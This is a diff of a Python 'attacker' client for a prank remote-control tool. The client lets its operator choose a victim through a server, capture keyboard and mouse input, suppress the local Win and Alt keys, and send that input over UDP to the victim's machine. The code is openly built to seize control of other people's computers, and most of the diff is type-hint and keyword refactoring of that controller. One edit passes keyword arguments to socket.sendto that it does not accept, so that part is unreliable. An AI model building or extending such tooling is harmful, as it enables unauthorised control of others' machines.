@@ -3,6 +3,7 @@ from tkinter import *
 import keyboard
 import pygame
 from pygame.locals import *
+from tkinter import messagebox
 
 are_down = []
 
@@ -23,12 +24,12 @@ class TkInterScreen:
         self.menu = None
         self.start_trolling = None
 
-    def on_closing(self):
+    def on_closing(self) -> None:
         SocketData.s.sendto("attacker exit".encode(), SocketData.ip_of_server)
         self.root.destroy()
         SocketData.want_to_leave = True
 
-    def send_choice(self):
+    def send_choice(self) -> None:
         if self.choice.get() != "whom to troll: ":
             SocketData.s.sendto(f"choice{int(self.choice.get()[0]) - 1}".encode(), SocketData.ip_of_server)
             while not SocketData.ip_of_victim:
@@ -40,9 +41,9 @@ class TkInterScreen:
             self.menu = None
             self.start_trolling = None
         else:
-            print("choose first")
+            messagebox.showerror("No selection error", "Choose First")
 
-    def main_loop(self):
+    def main_loop(self) -> None:
         self.root = Tk()
         self.root.title("Ewwww GUI")
         self.root.configure(bg="#1b1b38")
@@ -63,7 +64,7 @@ class TkInterScreen:
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
         self.root.mainloop()
 
-    def update_options(self, to_add: str):
+    def update_options(self, to_add: str) -> None:
         if self.options.__contains__('whom to troll: '):
             self.options.remove('whom to troll: ')
         self.options.append(to_add)
@@ -80,7 +81,7 @@ class PygameScreen:
         self.screen = None
         self.is_pygame_screen_in_focus = False
 
-    def run(self):
+    def run(self) -> None:
         self.is_pygame_screen_in_focus = False
         self.screen = pygame.display.set_mode((400, 400), RESIZABLE)
         while 1:
@@ -103,41 +104,39 @@ class PygameScreen:
                     case pygame.KEYDOWN:
                         if str(event.key) not in are_down:
                             are_down.append(str(event.key))
-                            pack_and_send(get_virtual_code_of_event(event) * 4)
+                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
                     case pygame.KEYUP:
                         if str(event.key) in are_down:
                             are_down.remove(str(event.key))
-                            pack_and_send(get_virtual_code_of_event(event) * 4 + 2)
+                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
                     case pygame.MOUSEBUTTONDOWN:
                         pack_and_send(generate_number_to_represent_mouse_event(event))
                     case pygame.MOUSEBUTTONUP:
                         generated_number = generate_number_to_represent_mouse_event(event)
                         if generated_number not in [0, 9, 25]:
-                            pack_and_send(generated_number + 16)
+                            pack_and_send(to_pack=generated_number + 16)
                     case pygame.MOUSEMOTION:
                         pack_and_send(204800 * pygame.mouse.get_pos()[0] // self.screen.get_size()[0] + 1600 *
                                       pygame.mouse.get_pos()[1] // self.screen.get_size()[1] + 1)
 
 
-def pack_and_send(to_pack2: int):
-    if to_pack2:
-        x = to_pack2
-        packed = x.to_bytes(4, 'little')
-        print(to_pack2, "packed is", packed)
-        SocketData.s.sendto(packed, SocketData.ip_of_victim)
+def pack_and_send(to_pack: int) -> None:
+    if to_pack:
+        packed = to_pack.to_bytes(4, 'little')
+        SocketData.s.sendto(__data=packed, __address=SocketData.ip_of_victim)
 
 
-def hook_keys():
-    keyboard.hook_key('win', win_pressed, True)
-    keyboard.hook_key('alt', alt_pressed, True)
+def hook_keys() -> None:
+    keyboard.hook_key(key='win', callback=win_pressed, suppress=True)
+    keyboard.hook_key(key='alt', callback=alt_pressed, suppress=True)
 
 
-def unhook_keys():
+def unhook_keys() -> None:
     keyboard.unblock_key('alt')
     keyboard.unblock_key('win')
 
 
-def generate_number_to_represent_mouse_event(event):
+def generate_number_to_represent_mouse_event(event) -> int:
     match event.button:
         case 1:  # left click
             return 3
@@ -153,7 +152,7 @@ def generate_number_to_represent_mouse_event(event):
             return False
 
 
-def get_virtual_code_of_event(event):
+def get_virtual_code_of_event(event) -> int:  # return statements are virtual codes
     match event.key:
         case pygame.K_0:
             return 0x30
@@ -323,19 +322,19 @@ def get_virtual_code_of_event(event):
             return False
 
 
-def win_pressed(event: pygame.event):
+def win_pressed(event: pygame.event) -> None:
     if event.event_type == 'down' and event.name not in are_down:
-        pack_and_send(364)
+        pack_and_send(to_pack=364)
         are_down.append(event.name)
     elif event.name in are_down and event.event_type == 'up':
-        pack_and_send(364 + 2)
+        pack_and_send(to_pack=364 + 2)
         are_down.remove(event.name)
 
 
-def alt_pressed(event: pygame.event):
+def alt_pressed(event: pygame.event) -> None:
     if event.event_type == 'down' and event.name not in are_down:
-        pack_and_send(0x12 * 4)
+        pack_and_send(to_pack=0x12 * 4)
         are_down.append(event.name)
     elif event.name in are_down and event.event_type == 'up':
-        pack_and_send(0x12 * 4 + 2)
+        pack_and_send(to_pack=0x12 * 4 + 2)
         are_down.remove(event.name)
